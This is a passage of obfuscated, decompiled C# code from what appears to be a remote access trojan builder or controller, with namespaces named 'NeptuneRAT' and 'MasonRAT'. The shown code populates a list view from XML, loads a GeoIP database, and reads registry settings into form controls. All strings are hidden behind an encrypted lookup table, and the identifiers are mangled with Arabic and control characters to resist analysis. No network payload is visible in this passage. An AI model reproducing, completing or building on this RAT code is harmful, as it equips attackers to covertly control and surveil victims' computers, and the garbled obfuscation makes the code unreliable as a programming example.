                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1421), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1422)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1423), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1424)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1425), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1426)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1427), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1428)))),
                NeptuneRAT.My.InternalXmlHelper.get_Value(descendant.Descendants(XName.Get(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1429), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1430))))
              },
              ForeColor = Color.Red
            }
          });
        }
      }
      finally
      {
        IEnumerator<XElement> enumerator;
        enumerator?.Dispose();
      }
      this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      string str = Path.Combine(Application.StartupPath, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1431));
      if (File.Exists(str))
        Form1.\u2694️MasonRAT\u270Cؤﻼ\u060Dٺټ\u060B\u060C\u060Aڙڙ\u0608ﻻ\u0609ـ = new GeoIP(str);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1432), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1433), (object) null), (object) null, false), Operators.CompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1434), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1435), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1436), false))))
    {
      this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609 = (string) null;
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked = false;
    }
    else
    {
      this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609 = Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1437), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1438), (object) null));
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked = true;
    }
    if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1439), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1440), (object) null), (object) null, false), Operators.CompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1441), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1442), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1443), false))))
    {
      this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = (string) null;
      this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked = false;
      this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.Image = (Image) null;
    }
    else
    {
      this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1444), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1445), (object) null));
      this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked = true;
      this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.ImageLocation = this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ;
    }
    this.\u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ.Checked = Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1446), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1447), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1448), false);
    this.\u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة.Checked = Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1449), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1450), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1451), false);
    this.\u2694️MasonRAT\u270Cٺڣٺ\u060Fٺ\u0609̍\u060B\u060Eۨ\u060Dڕ.Checked = Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1452), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1453), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1454), false);
    this.\u2694️MasonRAT\u270Cٽـټ\u060A\u0020ٸـ\u060E\u0608ـۡــ̍\u060D.Checked = Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1455), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1456), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1457), false);
    this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Text = !Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1458), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1459), (object) null), (object) null, false) ? Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1461), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1462), (object) null)) : \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1460);
    this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text = !Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1463), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1464), (object) null), (object) null, false) ? Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1466), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1467), (object) null)) : \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1465);
    this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Text = !Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1468), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1469), (object) null), (object) null, false) ? Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1471), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1472), (object) null)) : \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1470);
